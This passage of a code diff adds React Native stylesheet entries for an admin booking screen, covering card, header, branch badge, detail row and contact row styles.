+  filterChipTextActive: { color: '#FFF' },
+  adminBookingCard: { backgroundColor: Colors.cardBg, borderRadius: 20, padding: 20, marginBottom: 16, borderWidth: 1, borderColor: Colors.border, shadowColor: '#94A3B8', shadowOpacity: 0.05, shadowRadius: 10, shadowOffset: { width: 0, height: 4 }, elevation: 2 },
+  adminBookingHeader: { flexDirection: 'row', justifyContent: 'space-between', alignItems: 'center', marginBottom: 16, paddingBottom: 16, borderBottomWidth: 1, borderBottomColor: Colors.border },
+  adminName: { fontSize: 17, fontWeight: '800', color: Colors.darkText },
+  adminBranchBadge: { backgroundColor: '#E0F2FE', paddingHorizontal: 10, paddingVertical: 4, borderRadius: 12 },
+  adminBranchText: { fontSize: 11, fontWeight: '800', color: '#0284C7', textTransform: 'uppercase' },
+  adminDetailsRow: { flexDirection: 'row', justifyContent: 'space-between', marginBottom: 16 },
+  adminDetailItem: { flex: 1 },
+  adminDetailLabel: { fontSize: 10, fontWeight: '800', color: Colors.lightText, letterSpacing: 1, marginBottom: 4 },
+  adminDetailValue: { fontSize: 15, fontWeight: '700', color: Colors.darkText },
+  adminDetailSub: { fontSize: 13, color: Colors.primary, fontWeight: '600', marginTop: 2 },
+  adminContactRow: { flexDirection: 'row', alignItems: 'center', backgroundColor: Colors.inputBg, padding: 12, borderRadius: 12 },
+  adminContactText: { fontSize: 14, fontWeight: '600', color: Colors.darkText, marginLeft: 8 },
 });
